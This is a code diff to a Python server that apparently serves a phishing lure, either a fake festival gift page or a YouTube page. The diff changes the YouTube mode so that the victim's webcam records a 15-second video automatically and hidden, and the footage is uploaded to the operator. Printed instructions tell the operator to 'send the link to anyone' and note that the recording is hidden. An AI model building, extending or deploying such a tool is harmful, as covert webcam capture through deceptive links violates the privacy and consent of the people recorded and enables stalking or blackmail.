@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - Dual Mode with Terminal Menu
+Gift Video Receiver Server - Dual Mode
+YouTube mode: Just shows video with hidden camera
+Festival mode: Gift page with festival name
 """
 
 import os
@@ -9,6 +11,7 @@ import time
 import json
 import subprocess
 import threading
+import urllib.parse
 import urllib.request
 from datetime import datetime
 from pathlib import Path
@@ -61,7 +64,7 @@ def upload_video():
             return jsonify({'error': 'No filename'}), 400
 
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"gift_{timestamp}.webm"
+        filename = f"video_{timestamp}.webm"
         filepath = os.path.join(UPLOAD_FOLDER, filename)
 
         video_file.save(filepath)
@@ -134,8 +137,8 @@ class GiftServer:
         print("🎁 GIFT VIDEO RECEIVER")
         print("="*60)
         print("\nSelect mode:")
-        print("  1. 🎊 Festival Mode - Gift/surprise page")
-        print("  2. 🎬 YouTube Mode - YouTube video with gift")
+        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
+        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
         print("\n" + "-"*60)
         
         while True:
@@ -160,12 +163,30 @@ class GiftServer:
         print("\n🎬 Enter YouTube video URL or ID:")
         print("   (Press Enter for default video)")
         video = input("   ▶ ").strip()
+        
+        # Extract video ID if URL is provided
+        if video and ('youtube.com' in video or 'youtu.be' in video):
+            import re
+            patterns = [
+                r'(?:youtube\.com\/watch\?v=)([^&]+)',
+                r'(?:youtu\.be\/)([^?]+)',
+                r'(?:youtube\.com\/embed\/)([^?]+)'
+            ]
+            for pattern in patterns:
+                match = re.search(pattern, video)
+                if match:
+                    video = match.group(1)
+                    break
+        
         if not video:
             video = "dQw4w9WgXcQ"  # Rick Astley - Never Gonna Give You Up
             print(f"   Using default video ID: {video}")
+        else:
+            print(f"   Using video ID: {video}")
+        
         return video
 
-    def generate_link(self, mode, name, video_id=None):
+    def generate_link(self, mode, name=None, video_id=None):
         """Generate the appropriate link based on mode"""
         base_url = self.ngrok_url
         
@@ -173,7 +194,7 @@ class GiftServer:
             link = f"{base_url}/festival?name={urllib.parse.quote(name)}"
             mode_name = "🎊 Festival Mode"
         else:
-            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&name={urllib.parse.quote(name)}"
+            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}"
             mode_name = "🎬 YouTube Mode"
         
         return link, mode_name
@@ -246,7 +267,7 @@ class GiftServer:
         print("✅ Server running")
 
     def wait_for_videos(self):
-        print("\n🎁 Waiting for gifts... (Press Ctrl+C to stop)")
+        print("\n🎁 Waiting for videos... (Press Ctrl+C to stop)")
         print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
         print("-"*50)
         print("\n⏳ Waiting for first video...")
@@ -290,13 +311,13 @@ class GiftServer:
             mode = self.show_menu()
             
             # Get details based on mode
-            name = self.get_festival_name()
-            
             if mode == 'festival':
+                name = self.get_festival_name()
                 video_id = None
                 mode_display = "🎊 Festival Mode"
             else:
                 video_id = self.get_youtube_video()
+                name = None
                 mode_display = "🎬 YouTube Mode"
             
             # Start server
@@ -322,15 +343,15 @@ class GiftServer:
                 print("   4. They grant camera permission")
                 print("   5. 15-second video auto-records (hidden)")
                 print("   6. Video saves to your computer!")
+                print(f"\n🎊 Festival Name: {name}")
             else:
                 print("\n📋 Instructions:")
                 print("   1. Send the link above to anyone")
                 print("   2. They see a YouTube video playing")
-                print("   3. They click 'Open Your Gift'")
-                print("   4. They grant camera permission")
-                print("   5. 15-second video auto-records (hidden)")
-                print("   6. Video saves to your computer!")
-                print(f"\n📌 YouTube Video ID: {video_id}")
+                print("   3. Camera records automatically (hidden)")
+                print("   4. 15-second video auto-records")
+                print("   5. Video saves to your computer!")
+                print(f"\n🎬 YouTube Video ID: {video_id}")
             
             print("="*60)
             print("\n📋 Link printed above - copy it manually")
